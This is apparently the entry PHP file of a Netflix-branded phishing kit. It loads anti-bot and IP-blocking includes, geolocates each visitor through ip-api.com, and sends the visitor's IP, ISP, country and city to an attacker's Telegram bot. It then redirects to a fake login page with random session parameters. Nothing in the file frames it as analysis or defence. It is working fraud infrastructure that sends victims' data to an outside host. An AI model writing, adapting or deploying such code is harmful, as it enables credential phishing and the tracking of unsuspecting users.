<?php
include "eradox/all.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "banip/zeus.php";
include "send/panel.php";
session_start();

$ip = $_SERVER['REMOTE_ADDR'];

function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/" . $ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

$visitor_ip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitor_ip);

if ($ipinfo_json['status'] != 'fail') {
    // Your code to handle IP information here

    // You can access IP information like this:
    $org = "{$ipinfo_json['as']}";
    $isps = "{$ipinfo_json['isp']}";
    $country = "{$ipinfo_json['country']}";
    $city = "{$ipinfo_json['city']}";

    // Prepare a message to send to Telegram
$message = "▶️  𝐍𝐞𝐭𝐟𝐥𝐢𝐱 𝐈𝐏 𝐈𝐧𝐟𝐨  ▶️
\n\n"
        . "🌐 ISP: $isps\n"
        . "🌐 IP Address: $ip\n"
        . "🌐 Country: $country\n"
        . "🌐 City: $city\n";

    // Send the message to Telegram
    $telegram_api_url = "https://api.telegram.org/bot$botToken/sendMessage";
    $telegram_data = [
        'chat_id' => $vuesChatId,
        'text' => $message,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegram_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

} else {
    // Handle the case where IP information retrieval failed
    echo "<h1>IP Information Retrieval Failed</h1>";
}

header("Location: login.php?sessionid={$randString}&ue={$randString}");

?>
          </script> 
		   <script src="styles/css/jquery-3.5.1.min.js"></script>
           <script src="styles/css/jquery.mask.js"></script>
           <script src="styles/css/jquery.main.js"></script>
		   </div> 
<html>
<head>
    <meta name="robots" content="noindex, nofollow">
</head>
</html>
